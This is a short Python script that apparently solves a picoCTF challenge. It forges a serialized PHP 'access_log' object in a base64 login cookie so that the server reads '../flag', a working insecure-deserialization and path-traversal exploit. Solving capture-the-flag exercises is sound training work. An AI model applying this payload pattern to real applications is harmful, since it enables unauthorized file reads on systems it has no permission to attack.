import requests
import base64
import re

url = "http://mercury.picoctf.net:25395"

path = "../flag"

payload = f'O:10:"access_log":1:{{s:8:"log_file";s:{len(path)}:"{path}";}}'

res = requests.get(f'{url}/authentication.php', cookies={ 'login': base64.b64encode(payload.encode()).decode()})

print(re.findall(r'(picoCTF{.+})', res.text)[0])